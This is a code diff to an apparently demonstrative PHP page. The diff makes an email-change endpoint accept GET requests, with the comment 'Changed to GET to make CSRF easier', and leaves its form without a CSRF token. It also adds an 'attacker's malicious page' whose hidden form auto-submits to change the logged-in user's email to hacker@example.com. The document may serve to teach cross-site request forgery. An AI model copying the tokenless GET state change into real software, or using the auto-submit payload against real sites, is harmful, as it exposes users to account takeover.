@@ -12,8 +12,8 @@ if (!isset($_SESSION['user_id'])) {
 }
 
 // Vulnerable Email Change Script (change_email.php)
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
-    $new_email = $_POST['email'];
+if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['email'])) { // Changed to GET to make CSRF easier
+    $new_email = $_GET['email'];
     $user_id = $_SESSION['user_id'];
     
     // Critical Vulnerabilities:
@@ -36,7 +36,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
 </head>
 <body>
     <h2>Legitimate Email Change Form</h2>
-    <form action="" method="POST"> <!-- Vulnerable: No CSRF Token -->
+    <form action="" method="GET"> <!-- Vulnerable: No CSRF Token -->
         <label for="email">New Email:</label>
         <input type="email" name="email" required>
         <button type="submit">Change Email</button>
@@ -46,7 +46,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
     
     <h2>Attacker's Malicious Page</h2>
     <p>Click below to receive a free gift!</p>
-    <img src="#" onerror="this.src='http://localhost/change_email.php?email=hacker@example.com'">
-    
+    <form id="csrfForm" action="http://localhost/change_email.php" method="GET"> 
+        <input type="hidden" name="email" value="hacker@example.com">
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit(); // Auto-submit to trigger CSRF
+    </script>
 </body>
 </html>
